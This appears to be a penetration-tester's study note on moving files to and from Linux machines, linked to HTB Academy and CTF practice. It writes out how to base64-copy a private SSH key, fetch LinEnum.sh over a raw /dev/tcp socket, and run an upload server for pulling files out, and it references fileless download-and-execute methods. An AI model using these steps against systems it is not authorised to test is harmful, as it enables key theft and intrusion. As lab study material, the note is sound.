# Linux File Transfer

## Table of Contents
```table-of-contents
exclude: /Table of Contents/i
minLevel: 2
style: nestedList
hideWhenEmpty: true
```

## Overview

What this technique is and when I need it

## Downloading

### Base64 Encoding

**Step 1:** Check the MD5 hash of the contents.
```bash
md5sum id_rsa
```

**Step 2:** Encode contents to base64 and copy it to clipboard.
```bash
cat id_rsa | base64 -w 0; echo
```

**Step 3:** On the second Linux machine, decode the Base64 file content.
```bash
echo -n 'encoded' | base64 -d > id_rsa
```

**Step 4:** Confirm the MD5 hash matches.
```bash
md5sum id_rsa
```

### wget

#### Method 1: Download

Download a file.
![[wget#^simple-download]]

#### Method 2: Download - Fileless

Download and execute a file in memory (fileless).
![[wget#^fileless-download]]

### cURL

#### Method 1: Download

Download a file.
![[curl#^simple-download]]

#### Method 2: Download - Fileless

Download and execute a file in memory (fileless).
![[curl#^fileless-download]]

### Bash

#### Method 1: /dev/tcp

**Step 1:** Connect to the target webserver.
```bash
exec 3<>/dev/tcp/10.10.10.32/80
```

**Step 2:** Send a HTTP GET request for the file.
```bash
echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
```

**Step 3:** Print the response.
```bash
cat <&3
```

### SSH

#### Method 1: SCP

![[scp#^download-file-from-linux]]

### Code
#### Method 1: Python

**Step 1:** Create a webserver
![[python#^python3-webserver]]

**Step 2:** Download a file.
![[python#^download-remote-file]]

#### Method 2: PHP

**Step 1:** Create a webserver.
![[php#^create-webserver]]

**Step 2:** Download a file.
![[php#^download-remote-file]]

#### Method 3: Ruby

**Step 1:** Create a webserver.
![[ruby#^create-webserver]]

**Step 2:** Download a file.
![[ruby#^download-remote-file]]

#### Method 4: Perl

**Step 1:** Create a webserver.
![[perl#^create-webserver]]

**Step 2:** Download a file.
![[perl#^download-remote-file]]


## Uploading

### HTTP

#### Method 1: uploadserver

**Step 1:** Create a Self-Signed Certificate
```bash
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
```

**Step 2:** Start the webserver
```bash
mkdir www && cd www; sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
```

**Step 3:** Upload files.
![[curl#^upload-multiple-files-insecure]]

### SSH

#### Method 1: SCP

![[scp#^upload-file-to-linux]]

### Python

#### Method 1: uploadserver

**Step 1:** Start the webserver
![[python#^uploadserver]]

**Step 2:** Upload a file.
![[python#^upload-file]]

### Netcat

**Step 1:** On one Linux machine, open a listener to write the expected file data.
![[netcat#^receive-file-over-tcp]]

**Step 2:** On the other machine, send the file.
![[netcat#^send-file-over-tcp]]

### Ncat

**Step 1:** On one Linux machine, open a listener to write the expected file data.
![[ncat#^receive-file-from-listener]]

**Step 2:** On the other machine, send the file.
![[ncat#^send-file-to-listener]]

## File Encryption

**Step 1:** Encrypt a file
![[openssl#^encrypt-file-aes]]

**Step 2:** Decrypt the file
![[openssl#^decrypt-file-aes]]

## GTFOBins

To search for the download and upload function in [GTFOBins](https://gtfobins.github.io/) for Linux Binaries, we can use `+file download` or `+file upload`.
![[Pasted image 20250614115249.png]]

## Related Techniques

- [[Windows File Transfer]]
- [[Linux PrivEsc]]

## CTF Examples

```dataview
TABLE file.name as "Box", choice(contains(file.tags, "easy"), "🟢", choice(contains(file.tags, "medium"), "🟡", "🔴")) as "Diff"
FROM "06-CTF-Writeups" AND #linux-file-transfer
SORT file.ctime DESC
LIMIT 5
```

## Learning Resources

- [File Transfers - HTB Academy](https://academy.hackthebox.com/module/details/24)

#linux-file-transfer #technique